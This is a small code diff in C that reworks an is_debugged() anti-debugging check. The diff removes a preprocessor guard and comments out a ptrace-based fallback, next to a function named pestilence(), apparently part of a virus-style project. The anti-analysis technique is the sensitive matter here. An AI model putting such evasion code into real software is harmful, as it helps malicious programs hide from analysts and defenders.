@@ -134,7 +134,7 @@ static int forbid_proc(void)
 	return 0;
 }
 
-#ifdef ENABLE_EXEC
+#
 static int is_debugged(void) {
 
 	int res = 0;
@@ -163,14 +163,13 @@ static int is_debugged(void) {
 	close(fd);
 	return res;
 }
-#else
-static int	is_debugged(void)
-{
-	if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
-		return (1);
-	return (0);
-}
-#endif
+
+//static int	is_debugged(void)
+//{
+//	if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
+//		return (1);
+//	return (0);
+//}
 
 int pestilence(void)
 {
